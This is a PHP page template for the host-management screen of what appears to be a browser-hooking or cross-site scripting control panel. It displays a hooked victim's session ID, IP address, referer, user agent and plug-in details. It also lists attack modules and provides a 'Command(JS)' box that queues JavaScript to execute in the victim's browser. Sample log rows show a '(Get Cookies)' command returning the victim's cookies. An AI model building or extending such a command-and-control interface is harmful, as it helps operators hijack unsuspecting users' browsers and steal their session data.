<?php
if (! defined ( "PMX_ENTRANCE" )) {
	header ( "HTTP/1.0 404 Not Found" );
	exit ();
}
$id = isset ( $_GET ['id'] ) ? intval ( $_GET ['id'] ) : "";
$pmxHost = new pmxHost ();
if (! $pmxHost->isExistID ( $id )) {
	die ( "Error: ID is non-existent" );
}
$hostDetail = $pmxHost->getDetailByID ( $id );
?>
<?php pmx_require_header("Host Management"); ?>
<?php pmx_require_nav(""); ?>
<div class="main">
	<div class="main-item-single main-item-hosts-item pull-left">
		<div
			class="main-item-single-left main-item-single-host-item-tabs  pull-left">
			<ul class="nav nav-tabs host-item-tabs" role="tablist">
				<li class="hostinfo active"><a href="#">Host Info</a></li>
				<!--   <li class="logs"><a href="#">Logs</a></li>
			 <li class="cookies"><a href="#">Cookies</a></li> -->
			</ul>
			<div class="host-mgmt-item host-mgmt-item-1 host-mgmt-item-hostinfo">
				<table class="table table-condensed table-bordered">
					<tr>
						<td><b>SID</b> <a
							href="<?php echo pmx_getactionurl_delHostLogSID($hostDetail['sid']); ?>"
							onclick="return confirm('Are sure to delete the session you selected ?');">DEL</a></td>
						<td><select class="form-control">
<?php
$ipSIDList = (new pmxHosts ())->getSIDList ( $hostDetail ['ip'] );
if (count ( $ipSIDList ) > 0) {
	foreach ( $ipSIDList as $ipSIDList_item ) {
		$domain = get_url_domain ( $ipSIDList_item ["HTTP_REFERER"] );
		if ($domain == "unknow") {
			$domain = get_url_domain ( $ipSIDList_item ["location"] );
		}
		?>
							  <option
									href="<?php echo pmx_geturl_hostdetail($ipSIDList_item["id"]); ?>"
									title="<?php echo esc_html($ipSIDList_item['sid']);?>"
									<?php echo ($ipSIDList_item["id"] == $id)?"selected":""; ?>>(<?php echo ($ipSIDList_item['status'] == 1)?"Online":"Offline";?> : <?php echo esc_html($domain); ?>) <?php echo ($ipSIDList_item['title'] != "")?esc_html($ipSIDList_item['title']):"unknow";?></option>
<?php
	}
}
?>
							</select></td>
					</tr>
					<tr>
						<td><b>IP</b> <a
							href="<?php echo pmx_getactionurl_delHost($hostDetail['ip']); ?>"
							onclick="return confirm('Are sure to delete the logs belong to <?php echo esc_html($hostDetail['ip']); ?> ?');">DEL</a></td>
						<td><?php echo esc_html($hostDetail['ip']);?></td>
					</tr>
					<tr>
						<td><b>Status</b></td>
						<td><?php echo ($hostDetail['status'] == 1)?"Online":"Offline";?></td>
					</tr>
					<tr>
						<td><b>First Request</b></td>
						<td><?php echo esc_html($hostDetail['firstRequest']);?></td>
					</tr>
					<td><b>Lastest Request</b></td>
					<td><?php echo esc_html($hostDetail['lastestRequest']);?></td>
					</tr>
					<tr>
						<td><b>Location</b></td>
						<td><?php echo esc_html($hostDetail['location']);?></td>
					</tr>
					<tr>
						<td><b>HTTP_REFERER</b></td>
						<td><?php echo esc_html($hostDetail['HTTP_REFERER']);?></td>
					</tr>
					<tr>
						<td><b>HTTP_USER_AGENT</b></td>
						<td><?php echo esc_html($hostDetail['HTTP_USER_AGENT']);?></td>
					</tr>
					<tr>
						<td><b>HTTP_ACCEPT</b></td>
						<td><?php echo esc_html($hostDetail['HTTP_ACCEPT']);?></td>
					</tr>
					<tr>
						<td><b>About</b></td>
						<td><b> Title : </b><?php echo ($hostDetail['title'] != "")?esc_html($hostDetail['title']):"unknow";?><br>
							<b> Screen : </b><?php echo ($hostDetail['screen'] != "")?esc_html($hostDetail['screen']):"unknow";?><br>
							<b> Flash : </b><?php echo ($hostDetail['flash'] != "")?esc_html($hostDetail['flash']):"unknow";?><br>
							<b> Java : </b><?php echo ($hostDetail['java'] != "")?esc_html($hostDetail['java']):"unknow";?><br>
							<b> SID : </b><?php echo ($hostDetail['sid'] != "")?esc_html($hostDetail['sid']):"unknow";?><br>
						</td>
					</tr>
				</table>
			</div>
			<div class="host-mgmt-item host-mgmt-item-2 host-mgmt-item-logs hide">
				<table class="table table-condensed table-bordered">
					<tr>
						<td>+</td>
						<th>Command</th>
						<th>Time</th>
						<th>Response</th>
					</tr>
					<tr>
						<td class="host-mgmt-item-log-detail"><a><span></span></a></td>
						<td>(Get Cookies)</td>
						<td>2014-08-21 00:28:14</td>
						<td>_gauges_unique_month=1; _gauges_unique_year=1;
							_gauges_unique=1; _ga=GA1.2.1251905990.1407913490</td>
					</tr>
				</table>
			</div>
			<!-- 			<div class="host-mgmt-item host-mgmt-item-3 host-mgmt-item-cookies hide">
				<table class="table table-condensed table-bordered">
					<tr>
						<td>+</td>
						<th>Location</th>
						<th>Cookies</th>
					</tr>
					<tr>
						<td  class="host-mgmt-item-cookies-detail"><a><span></span></a></td>
						<td>http://www.xxx.com</td>
						<td>_gauges_unique_month=1; _gauges_unique_year=1; _gauges_unique=1; _ga=GA.****</td>
					</tr>
				</table>
			</div> -->
			<div
				class="host-mgmt-item host-mgmt-item-3 host-mgmt-item-log-detail hide">
				<table class="table table-condensed table-bordered">
					<tr>
						<td><b>ID</b></td>
						<td>13123</td>
					</tr>
					<tr>
						<td><b>Command</b></td>
						<td>(Get Cookies)</td>
					</tr>
					<tr>
						<td><b>Time</b></td>
						<td>2014-08-21 00:28:14</td>
					</tr>
					<tr>
						<td><b>Response Time</b></td>
						<td>2014-08-21 00:28:16</td>
					</tr>
					<tr>
						<td><b>Response Content</b></td>
						<td>{"Cookie","_gauges_unique_month=1; _gauges_unique_year=1;
							_gauges_unique=1; _ga=GA1.2.1251905990.1407913490"}</td>
					</tr>
				</table>
			</div>
		</div>
		<div
			class="main-item-single-right main-item-single-host-module pull-left">
			<div class="host-mgmt-item host-mgmt-item-4 host-mgmt-item-module">
<?php
$mods = get_module_list ();
foreach ( $mods as $mod ) {
	?>
					  <div class="module-item"
					only="<?php echo esc_html($mod['only']);?>"
					id="<?php echo esc_html($mod['id']);?>"
					url="<?php echo pmx_getapiurl_modconfig($mod['id']);?>">
					<a href="#"><span class="name"><?php echo esc_html($mod['name']);?></span>
						- <span class="desc"><?php echo esc_html($mod['desc']);?></span></a>
				</div>
<?php } ?>
		</div>
		</div>
		<div class="main-item-single-block  pull-left">
			<form class="form-horizontal" action="#" method="POST" role="form">
				<div class="host-mgmt-item host-mgmt-item-5 host-mgmt-commands">
					<div class="command">
						<div class="form-group">
							<div class="col-sm-9">
								<input type="text" name="command" class="form-control"
									id="inputCommand" placeholder="Command(JS)">
							</div>
							<div class="col-sm-3">
								<button class="btn btn-default" type="button"
									sid="<?php echo $hostDetail["sid"];?>" hid="<?php echo $id; ?>">Execute</button>
								<input type="hidden" name="addcommandurl"
									value="<?php echo (new pmxURL())->get_addcommand_actionurl($hostDetail["sid"]);?>">
								<input type="hidden" name="addcommandhostlogurl"
									value="<?php echo (new pmxURL())->get_hostlog_apiurl($hostDetail["sid"]);?>">
							</div>
						</div>
					</div>
					<div class="waitingresponse"></div>
					<div class="response"></div>
				</div>
			</form>
		</div>
	</div>
</div>

<div id="modal-config-module" class="modal fade"
	style="z-index: 999999999999">
	<div class="modal-dialog">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal"
					aria-hidden="true">&times;</button>
				<h4 class="modal-title">Config Module</h4>
			</div>
			<div class="modal-body">
				<form class="form-horizontal" role="form"></form>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
				<button type="submit" class="btn btn-primary">Submit</button>
			</div>
		</div>
		<!-- /.modal-content -->
	</div>
	<!-- /.modal-dialog -->
</div>
<!-- /.modal -->
<script language="javascript">
$(function(){
	function loadHostMgmtLogs(){
		$.loadHostMgmtLogs();
	}
	setInterval(loadHostMgmtLogs, 1000);
});
</script>
<?php pmx_require_footer(); ?>